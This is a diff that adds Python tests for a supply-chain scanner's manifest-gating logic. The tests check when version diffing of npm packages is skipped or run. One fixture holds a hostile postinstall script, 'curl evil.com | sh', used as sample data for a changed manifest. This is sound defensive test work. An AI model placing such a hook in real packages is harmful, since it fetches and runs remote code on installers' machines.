@@ -11,7 +11,7 @@ import pytest
 
 from daemon.config import Settings, get_settings
 from daemon.models import PillarScore
-from daemon.pillars.shield import Shield
+from daemon.pillars.shield import Shield, _scripts_and_deps_equal
 
 
 @pytest.fixture
@@ -455,6 +455,155 @@ async def test_diff_analysis_blends_score(shield: Shield) -> None:
     assert result.metadata["diff_score"] == 40.0
     assert result.metadata["new_imports"] == ["axios"]
     assert result.metadata["new_network_calls"] is True
+
+
+# ── Manifest-first gating ──────────────────────────────────────────────────────
+
+def test_scripts_and_deps_equal_true_for_identical_manifests() -> None:
+    a = {"scripts": {"postinstall": "node setup.js"}, "dependencies": {"lodash": "^4.0.0"}}
+    b = {"scripts": {"postinstall": "node setup.js"}, "dependencies": {"lodash": "^4.0.0"}}
+    assert _scripts_and_deps_equal(a, b) is True
+
+
+def test_scripts_and_deps_equal_false_for_differing_scripts() -> None:
+    a = {"scripts": {"postinstall": "node setup.js"}, "dependencies": {}}
+    b = {"scripts": {"postinstall": "curl evil.com | sh"}, "dependencies": {}}
+    assert _scripts_and_deps_equal(a, b) is False
+
+
+def test_scripts_and_deps_equal_false_for_differing_dependencies() -> None:
+    a = {"scripts": {}, "dependencies": {"lodash": "^4.0.0"}}
+    b = {"scripts": {}, "dependencies": {"lodash": "^4.0.0", "axios": "^1.0.0"}}
+    assert _scripts_and_deps_equal(a, b) is False
+
+
+def test_scripts_and_deps_equal_true_when_both_missing_fields() -> None:
+    assert _scripts_and_deps_equal({}, {}) is True
+
+
+def _versions_meta(cur_extra: dict | None = None, prev_extra: dict | None = None) -> dict:
+    """Build a package_metadata dict with both "2.0.0" and "1.0.0" defined,
+    identical scripts/dependencies by default (override via cur_extra/prev_extra
+    to make them differ)."""
+    base_cur = {"scripts": {}, "dependencies": {"lodash": "^4.0.0"},
+                "dist": {"tarball": "https://registry.example.com/pkg/-/pkg-2.0.0.tgz"}}
+    base_prev = {"scripts": {}, "dependencies": {"lodash": "^4.0.0"}}
+    if cur_extra:
+        base_cur.update(cur_extra)
+    if prev_extra:
+        base_prev.update(prev_extra)
+    return {
+        "dist-tags": {"latest": "2.0.0"},
+        "versions": {"2.0.0": base_cur, "1.0.0": base_prev},
+        "readme": "",
+        "description": "",
+    }
+
+
+@pytest.mark.asyncio
+async def test_manifest_gating_skips_diff_when_identical(shield: Shield) -> None:
+    """Identical scripts+dependencies between versions skip diff_package_versions
+    entirely, and the score is NOT discounted by the 0.75/0.25 blend (diff_ran
+    must stay False, not True-with-diff_score-0)."""
+    meta = _versions_meta()
+    with (
+        patch("daemon.pillars.shield.get_settings",
+              return_value=_settings_with_llm(enabled=False)),
+        patch("daemon.pillars.shield.get_admin_config", return_value={}),
+        patch.object(Shield, "scan_package_files",
+                     new=AsyncMock(return_value=(40.0, [], {"files_scanned": 1, "flags": 0, "skipped": None}))),
+        patch("daemon.utils.npm_registry.get_previous_version",
+              new=AsyncMock(return_value="1.0.0")),
+        patch("daemon.utils.diff_analyzer.diff_package_versions",
+              new=AsyncMock()) as mock_diff,
+    ):
+        result = await shield.score("some-pkg", package_metadata=meta)
+
+    mock_diff.assert_not_called()
+    # script_score=0 (no scripts), injection_score=0 (no readme/description),
+    # file_score=40.0 * FILE_SCAN_WEIGHT(0.6) = 24.0 — undiscounted.
+    # If diff_ran were incorrectly True with diff_score=0, this would instead
+    # be 24.0 * 0.75 = 18.0.
+    assert result.score == pytest.approx(24.0, abs=0.01)
+    assert result.metadata["diff_score"] == 0.0
+    assert result.metadata["new_network_calls"] is False
+    assert "diff_unavailable" not in result.flags
+
+
+@pytest.mark.asyncio
+async def test_manifest_gating_runs_diff_when_manifests_differ(shield: Shield) -> None:
+    """A dependency change between versions must still trigger the full diff."""
+    meta = _versions_meta(cur_extra={"dependencies": {"lodash": "^4.0.0", "axios": "^1.0.0"}})
+    diff_result = {
+        "diff_score": 40.0, "diff_flags": ["new_network_calls"],
+        "new_imports": ["axios"], "new_network_calls": True,
+    }
+    with (
+        patch("daemon.pillars.shield.get_settings",
+              return_value=_settings_with_llm(enabled=False)),
+        patch("daemon.pillars.shield.get_admin_config", return_value={}),
+        patch.object(Shield, "scan_package_files",
+                     new=AsyncMock(return_value=(0.0, [], {"files_scanned": 0, "flags": 0, "skipped": None}))),
+        patch("daemon.utils.npm_registry.get_previous_version",
+              new=AsyncMock(return_value="1.0.0")),
+        patch("daemon.utils.diff_analyzer.diff_package_versions",
+              new=AsyncMock(return_value=diff_result)) as mock_diff,
+    ):
+        result = await shield.score("some-pkg", package_metadata=meta)
+
+    mock_diff.assert_called_once()
+    assert result.metadata["diff_score"] == 40.0
+    assert result.metadata["new_network_calls"] is True
+
+
+@pytest.mark.asyncio
+async def test_manifest_gating_disabled_via_admin_config(shield: Shield) -> None:
+    """shield_manifest_gating=False forces the diff to run even when manifests match."""
+    meta = _versions_meta()
+    diff_result = {"diff_score": 0.0, "diff_flags": [], "new_imports": [], "new_network_calls": False}
+    with (
+        patch("daemon.pillars.shield.get_settings",
+              return_value=_settings_with_llm(enabled=False)),
+        patch("daemon.pillars.shield.get_admin_config",
+              return_value={"shield_manifest_gating": False}),
+        patch.object(Shield, "scan_package_files",
+                     new=AsyncMock(return_value=(0.0, [], {"files_scanned": 0, "flags": 0, "skipped": None}))),
+        patch("daemon.utils.npm_registry.get_previous_version",
+              new=AsyncMock(return_value="1.0.0")),
+        patch("daemon.utils.diff_analyzer.diff_package_versions",
+              new=AsyncMock(return_value=diff_result)) as mock_diff,
+    ):
+        await shield.score("some-pkg", package_metadata=meta)
+
+    mock_diff.assert_called_once()
+
+
+@pytest.mark.asyncio
+async def test_manifest_gating_skipped_when_prev_manifest_absent(shield: Shield) -> None:
+    """If the previous version isn't in the already-fetched versions map (e.g. a
+    partial/synthetic metadata dict), the gate can't confirm equality and must
+    not skip the diff — this is the pre-existing behavior test_diff_analysis_
+    blends_score already covers implicitly; this test makes it explicit."""
+    meta = {
+        "dist-tags": {"latest": "2.0.0"},
+        "versions": {"2.0.0": {"scripts": {}, "dist": {"tarball": "https://registry.example.com/pkg/-/pkg-2.0.0.tgz"}}},
+        "readme": "", "description": "",
+    }
+    diff_result = {"diff_score": 10.0, "diff_flags": [], "new_imports": [], "new_network_calls": False}
+    with (
+        patch("daemon.pillars.shield.get_settings",
+              return_value=_settings_with_llm(enabled=False)),
+        patch("daemon.pillars.shield.get_admin_config", return_value={}),
+        patch.object(Shield, "scan_package_files",
+                     new=AsyncMock(return_value=(0.0, [], {"files_scanned": 0, "flags": 0, "skipped": None}))),
+        patch("daemon.utils.npm_registry.get_previous_version",
+              new=AsyncMock(return_value="1.0.0")),
+        patch("daemon.utils.diff_analyzer.diff_package_versions",
+              new=AsyncMock(return_value=diff_result)) as mock_diff,
+    ):
+        await shield.score("some-pkg", package_metadata=meta)
+
+    mock_diff.assert_called_once()
 
 
 # ── AST: destructuring env access (lines 218-222) ────────────────────────────
